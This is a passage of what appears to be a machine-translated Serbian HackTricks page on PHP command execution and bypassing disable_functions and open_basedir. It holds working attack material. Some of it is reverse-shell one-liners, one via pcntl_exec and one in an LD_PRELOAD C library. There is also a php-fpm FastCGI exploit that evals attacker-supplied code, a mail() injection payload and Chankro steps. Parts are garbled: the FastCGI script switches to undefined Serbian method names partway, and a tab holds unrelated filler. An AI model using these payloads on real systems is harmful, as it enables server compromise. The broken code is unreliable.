# PHP - Korisne funkcije & disable\_functions/open\_basedir zaobilazak

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## PHP Komande & Izvr코enje Koda

### PHP Izvr코enje Komandi

**Napomena:** [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell mo쬰 **automatski** proveriti i zaobi캖i slede캖e funkcije ako su neke od njih onemogu캖ene.

**exec** - Vra캖a poslednju liniju izlaza komandi
```bash
echo exec("uname  -a");
```
**passthru** - Prosle캠uje izlaz komandi direktno u pretra쬴va캜
```bash
echo passthru("uname -a");
```
**sistem** - Prosle캠uje izlaz komandi direktno u pretra쬴va캜 i vra캖a poslednju liniju
```bash
echo system("uname -a");
```
**shell\_exec** - Vra캖a izlaz komandi
```bash
echo shell_exec("uname -a");
```
\`\` (backticks) - Isti kao shell\_exec()
```bash
echo `uname -a`
```
**popen** - Otvara 캜itanje ili pisanje cijevi ka procesu komande
```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```
**proc\_open** - Sli캜no kao popen() ali sa ve캖im stepenom kontrole
```bash
proc_close(proc_open("uname -a",array(),$something));
```
**preg\_replace**
```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```
**pcntl\_exec** - Izvr코ava program (podrazumevano, u modernom i ne ba코 modernom PHP-u, morate u캜itati modul `pcntl.so` da biste koristili ovu funkciju)
```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```
**mail / mb\_send\_mail** - Ova funkcija se koristi za slanje mejlova, ali mo쬰 biti zloupotrebljena za ubacivanje proizvoljnih komandi unutar `$options` parametra. Ovo je zato 코to **php `mail` funkcija** obi캜no poziva `sendmail` binarni fajl unutar sistema i dozvoljava vam da **dodate dodatne opcije**. Me캠utim, ne캖ete mo캖i videti izlaz iz izvr코ene komande, stoga se preporu캜uje kreiranje shell skripte koja upisuje izlaz u fajl, izvr코ava je koriste캖i mail, i prikazuje izlaz:
```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```
**dl** - Ova funkcija mo쬰 se koristiti za dinami캜ko u캜itavanje PHP ekstenzije. Ova funkcija ne캖e uvek biti prisutna, stoga treba proveriti da li je dostupna pre poku코aja iskori코캖avanja. Pro캜itajte [ovu stranicu da biste saznali kako iskoristiti ovu funkciju](disable\_functions-bypass-dl-function.md).

### Izvr코avanje PHP koda

Osim eval funkcije, postoje i drugi na캜ini za izvr코avanje PHP koda: include/require se mogu koristiti za udaljeno izvr코avanje koda u obliku ranjivosti lokalnog uklju캜ivanja datoteke i udaljenog uklju캜ivanja datoteke.
```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```
## disable\_functions & open\_basedir

**Onemogu캖ene funkcije** su postavke koje se mogu konfigurisati u `.ini` fajlovima u PHP-u koje 캖e **zabraniti** kori코캖enje nazna캜enih **funkcija**. **Open basedir** je postavka koja PHP-u pokazuje fasciklu kojoj mo쬰 pristupiti.\
PHP postavke treba konfigurisati na putanji _/etc/php7/conf.d_ ili sli캜no.

Obe konfiguracije mogu se videti u izlazu **`phpinfo()`**:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../.gitbook/assets/image (493).png>)

## open\_basedir Bypass

`open_basedir` 캖e konfigurisati fascikle kojima PHP mo쬰 pristupiti, **ne캖ete mo캖i pisati/캜itati/izvr코avati bilo koji fajl van** tih fascikli, ali tako캠e **ne캖ete mo캖i ni da vidite** druge direktorijume.\
Me캠utim, ako na neki na캜in mo쬰te izvr코iti proizvoljni PHP kod, mo쬰te **poku코ati** slede캖i deo **koda** kako biste **zaobi코li** ograni캜enje.

### Listing dirs with glob:// bypass

U ovom prvom primeru koristi se `glob://` protokol sa nekim zaobilaznim putanjama:
```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```
**Napomena1**: U putanji tako캠e mo쬰te koristiti `/e??/*` da biste naveli `/etc/*` i bilo koji drugi folder.\
**Napomena2**: Izgleda da je deo koda dupliciran, ali to je zapravo neophodno!\
**Napomena3**: Ovaj primer je koristan samo za listanje foldera, a ne za 캜itanje fajlova

### Potpuni open\_basedir zaobilazak zloupotrebom FastCGI

Ako 쬰lite da **saznate vi코e o PHP-FPM i FastCGI** mo쬰te pro캜itati [prvi deo ove stranice](disable\_functions-bypass-php-fpm-fastcgi.md).\
Ako je **`php-fpm`** konfigurisan, mo쬰te ga zloupotrebiti da potpuno zaobi캠ete **open\_basedir**:

![](<../../../../.gitbook/assets/image (545).png>)

![](<../../../../.gitbook/assets/image (577).png>)

Imajte na umu da prvo 코to treba da uradite je da prona캠ete gde se nalazi **unix socket php-fpm**. Obi캜no se nalazi u `/var/run`, tako da mo쬰te **koristiti prethodni kod da biste naveli direktorijum i prona코li ga**.\
Kod preuzet sa [ovde](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy).
```php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
```php
* @return String
*/
public function zahtev(array $params, $stdin)
{
$response = '';
$this->povezi();
$zahtev = $this->napraviPaket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsZahtev = '';
foreach ($params as $kljuc => $vrednost) {
$paramsZahtev .= $this->napraviNvpar(kljuc, $vrednost);
}
if ($paramsZahtev) {
$zahtev .= $this->napraviPaket(self::PARAMS, $paramsZahtev);
}
$zahtev .= $this->napraviPaket(self::PARAMS, '');
if ($stdin) {
$zahtev .= $this->napraviPaket(self::STDIN, $stdin);
}
$zahtev .= $this->napraviPaket(self::STDIN, '');
fwrite($this->_sock, $zahtev);
do {
$odgovor = $this->procitajPaket();
if ($odgovor['type'] == self::STDOUT || $odgovor['type'] == self::STDERR) {
$response .= $odgovor['content'];
}
} while ($odgovor && $odgovor['type'] != self::END_REQUEST);
var_dump($odgovor);
if (!is_array($odgovor)) {
throw new Exception('Lo코 zahtev');
}
switch (ord($odgovor['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('Ova aplikacija ne mo쬰 da multiplexuje [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('Novi zahtev odbijen; previ코e zauzeto [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Vrednost uloge nije poznata [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// pravi eksploataciju po캜inje ovde
if (!isset($_REQUEST['cmd'])) {
die("Proverite va코 unos\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$zahtev = '/'.basename($filepath);
$uri = $zahtev .'?'.'command='.$_REQUEST['cmd'];
$klijent = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Ne radi ni코ta
$php_vrednost = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_vrednost = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $zahtev,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $zahtev,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_vrednost,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Poziv: $uri\n\n";
echo $klijent->zahtev($params, $code)."\n";
?>
```
Ovi skriptovi 캖e komunicirati sa **unix socket-om php-fpm** (obi캜no sme코tenim u /var/run ako se koristi fpm) kako bi izvr코ili proizvoljan kod. Postavke `open_basedir` 캖e biti prebrisane atributom **PHP\_VALUE** koji se 코alje.\
Primetite kako se koristi `eval` za izvr코avanje PHP koda koji 코aljete unutar parametra **cmd**.\
Tako캠e primetite **komentarisani red 324**, mo쬰te ga odkomentarisati i **optere캖enje 캖e automatski povezati sa datim URL-om i izvr코iti PHP kod** koji se tamo nalazi.\
Jednostavno pristupite `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` da biste dobili sadr쬬j datoteke `/etc/passwd`.

{% hint style="warning" %}
Mo쬯a razmi코ljate da na isti na캜in na koji smo prebrisali konfiguraciju `open_basedir` mo쬰mo **prebrisati `disable_functions`**. Pa, poku코ajte, ali ne캖e raditi, izgleda da **`disable_functions` mo쬰 biti konfigurisan samo u `.ini` php** konfiguracionom fajlu i promene koje vr코ite koriste캖i PHP\_VALUE ne캖e biti efikasne na ovoj specifi캜noj postavci.
{% endhint %}

## Bypass disable\_functions

Ako uspete da izvr코ite PHP kod unutar ma코ine, verovatno 쬰lite da odete na slede캖i nivo i **izvr코ite proizvoljne sistem komande**. U ovoj situaciji je uobi캜ajeno otkriti da su ve캖ina ili sve PHP **funkcije** koje omogu캖avaju **izvr코avanje sistemskih komandi onemogu캖ene** u **`disable_functions`.**\
Dakle, pogledajmo kako mo쬰te zaobi캖i ovu restrikciju (ako mo쬰te)

### Automatsko otkrivanje zaobilaska

Mo쬰te koristiti alat [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) i on 캖e vam pokazati koju funkciju (ako bilo koju) mo쬰te koristiti za **zaobila쬰nje** **`disable_functions`**.

### Zaobila쬰nje kori코캖enjem drugih sistemskih funkcija

Vratite se na po캜etak ove stranice i **proverite da li je bilo koja od funkcija za izvr코avanje komandi dostupna u okru쬰nju**. Ako prona캠ete bar jednu od njih, mo캖i 캖ete je koristiti za izvr코avanje proizvoljnih sistemskih komandi.

### LD\_PRELOAD zaobila쬰nje

Dobro je poznato da neke funkcije u PHP-u poput `mail()` 캖e **izvr코iti binarne datoteke unutar sistema**. Stoga, mo쬰te ih zloupotrebiti koriste캖i promenljivu okru쬰nja `LD_PRELOAD` da bi u캜itale proizvoljnu biblioteku koja mo쬰 izvr코iti bilo 코ta.

#### Funkcije koje se mogu koristiti za zaobila쬰nje disable\_functions sa LD\_PRELOAD

* **`mail`**
* **`mb_send_mail`**: Efikasno kada je instaliran modul `php-mbstring`.
* **`imap_mail`**: Radi ako je prisutan modul `php-imap`.
* **`libvirt_connect`**: Zahteva modul `php-libvirt-php`.
* **`gnupg_init`**: Upotrebljivo sa instaliranim modulom `php-gnupg`.
* **`new imagick()`**: Ova klasa mo쬰 biti zloupotrebljena za zaobila쬰nje restrikcija. Detaljne tehnike eksploatacije mogu se prona캖i u sveobuhvatnom [**izve코taju ovde**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

Mo쬰te [**ovde prona캖i**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) skriptu za ispitivanje koja je kori코캖ena za pronala쬰nje ovih funkcija.

Ovde je biblioteka koju mo쬰te kompajlirati da zloupotrebite `LD_PRELOAD` promenljivu okru쬰nja:
```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```
#### Bypassovanje kori코캖enjem Chankro-a

Da biste iskoristili ovu konfiguraciju, mo쬰te koristiti [**Chankro**](https://github.com/TarlogicSecurity/Chankro). Ovo je alat koji 캖e **generisati PHP eksploit** koji treba da otpremite na ranjivi server i izvr코ite ga (pristupite mu putem veba).\
**Chankro** 캖e upisati unutar diska rtve **biblioteku i obrnutu ljusku** koju 쬰lite da izvr코ite i koristi캖e\*\* trik `LD_PRELOAD` + PHP `mail()`\*\* funkciju za izvr코avanje obrnute ljuske.

Imajte na umu da bi se koristio **Chankro**, `mail` i `putenv` **ne smeju se pojaviti unutar liste `disable_functions`**.\
U slede캖em primeru mo쬰te videti kako **kreirati Chankro eksploit** za **arh 64**, koji 캖e izvr코iti `whoami` i sa캜uvati izlaz u _/tmp/chankro\_shell.out_, Chankro 캖e **upisati biblioteku i payload** u _/tmp_ i **kona캜ni eksploit** 캖e se zvati **bicho.php** (to je datoteka koju treba otpremiti na server rtve):

{% tabs %}
{% tab title="shell.sh" %}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```
{% endtab %}

{% tab title="Chankro" %} 

Ovo je PHP trik zaobila쬰nja open_basedir ograni캜enja pomo캖u disable_functions. Kada su funkcije poput exec, shell_exec, popen, proc_open, symlink, dllink, link, system i passthru onemogu캖ene, mo쬰te koristiti slede캖i kod za izvr코avanje sistemskih komandi:

```php
<?php
$disabled_functions = explode(',', ini_get('disable_functions'));
$exec_enabled = !in_array('exec', $disabled_functions);
if ($exec_enabled) {
    $output = exec('ls');
    echo $output;
}
?>
```

Ovaj kod proverava da li je funkcija exec omogu캖ena, a zatim je koristi za izvr코avanje sistema komande "ls". Ako je funkcija exec onemogu캖ena, mo쬰te probati sa drugim funkcijama koje nisu na listi onemogu캖enih funkcija. 

Napomena: Ovo je samo demonstracija i ne preporu캜uje se kori코캖enje ovih tehnika bez odgovaraju캖eg ovla코캖enja. 

{% endtab %}
```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{% endtab %}
{% endtabs %}

Ako otkrijete da je funkcija **mail** blokirana onemogu캖enim funkcijama, mo쬯a 캖ete i dalje mo캖i koristiti funkciju **mb\_send\_mail.**\
Vi코e informacija o ovoj tehnici i Chankro ovde: [https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/)

### "Bypass" kori코캖enjem PHP mogu캖nosti

Imajte na umu da kori코캖enjem **PHP**-a mo쬰te **캜itati i pisati datoteke, kreirati direktorijume i menjati dozvole**.\
캛ak mo쬰te i **izbaciti baze podataka**.\
Mo쬯a kori코캖enjem **PHP**-a za **enumeraciju** kutije mo쬰te prona캖i na캜in za eskalaciju privilegija/izvr코avanje komandi (na primer, 캜itanje nekog privatnog ssh klju캜a).

Kreirao sam webshell koji olak코ava izvo캠enje ovih akcija (imajte na umu da 캖e vas ve캖ina webshellova tako캠e ponuditi ovim opcijama): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Bypass-ovi zavisni o modulima/verzijama

Postoje razli캜iti na캜ini zaobila쬰nja disable\_functions ako se koristi odre캠eni modul ili iskori코tava odre캠ena PHP verzija:

* [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable\_functions-bypass-php-fpm-fastcgi.md)
* [**Bypass sa FFI - omogu캖enim Foreign Function Interface-om**](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/broken-reference/README.md)
* [**Bypass preko mem**](disable\_functions-bypass-via-mem.md)
* [**mod\_cgi**](disable\_functions-bypass-mod\_cgi.md)
* [**PHP Perl Extension Safe\_mode**](disable\_functions-bypass-php-perl-extension-safe\_mode-bypass-exploit.md)
* [**dl funkcija**](disable\_functions-bypass-dl-function.md)
* [**Ovaj exploit**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
* 5.\* - iskoristiv sa manjim izmenama u PoC-u
* 7.0 - sve verzije do danas
* 7.1 - sve verzije do danas
* 7.2 - sve verzije do danas
* 7.3 - sve verzije do danas
* 7.4 - sve verzije do danas
* 8.0 - sve verzije do danas
* [**Od 7.0 do 8.0 eksploatacija (samo za Unix)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
* [**PHP 7.0=7.4 (\*nix)**](disable\_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
* [**Imagick 3.3.0 PHP >= 5.4**](disable\_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
* [**PHP 5.x Shellsock**](disable\_functions-php-5.x-shellshock-exploit.md)
* [**PHP 5.2.4 ionCube**](disable\_functions-php-5.2.4-ioncube-extension-exploit.md)
* [**PHP <= 5.2.9 Windows**](disable\_functions-bypass-php-less-than-5.2.9-on-windows.md)
* [**PHP 5.2.4/5.2.5 cURL**](disable\_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
* [**PHP 5.2.3 -Win32std**](disable\_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
* [**PHP 5.2 FOpen exploit**](disable\_functions-bypass-php-5.2-fopen-exploit.md)
* [**PHP 4 >= 4.2.-, PHP 5 pcntl\_exec**](disable\_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl\_exec.md)

### **Automatski alat**

Slede캖i skript poku코ava neke od ovde komentisanih metoda:\
[https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php)

## Druge zanimljive PHP funkcije

### Lista funkcija koje prihvataju povratne pozive

Ove funkcije prihvataju string parametar koji bi mogao biti kori코캖en za pozivanje funkcije po izboru napada캜a. Zavisno od funkcije, napada캜 mo쬰 ili ne mora imati mogu캖nost prosle캠ivanja parametra. U tom slu캜aju, funkcija Otkrivanja informacija poput phpinfo() mo쬰 biti kori코캖ena.

[Povratni pozivi / Pozivne funkcije](https://www.php.net/manual/en/language.types.callable.php)

[Prate캖e liste odavde](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```
### Otkrivanje informacija

Ve캖ina ovih poziva funkcija nisu propusti. Ali mo쬰 biti ranjivost ako je bilo koji od vra캖enih podataka vidljiv napada캜u. Ako napada캜 mo쬰 videti phpinfo(), to je definitivno ranjivost.
```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```
### Ostalo
```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```
### Funkcije sistema datoteka

Prema RATS-u, sve funkcije sistema datoteka u php-u su zlonamerne. Neke od njih se ne 캜ine vrlo korisnim napada캜u. Druge su korisnije nego 코to mo쬯a mislite. Na primer, ako je allow\_url\_fopen=On, tada se URL mo쬰 koristiti kao putanja do datoteke, pa se poziv na copy($\_GET\['s'], $\_GET\['d']); mo쬰 koristiti za otpremanje PHP skripta bilo gde na sistemu. Tako캠e, ako je sajt ranjiv na zahtev poslat putem GET, svaka od ovih funkcija sistema datoteka mo쬰 biti zloupotrebljena kako bi se kanalisao napad ka drugom hostu preko va코eg servera.

**Otvori rukovaoca sistemom datoteka**
```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```
**Pisanje u sistem datoteka (delimi캜no u kombinaciji sa 캜itanjem)**
```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```
**캛itanje sa fajl sistema**
```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
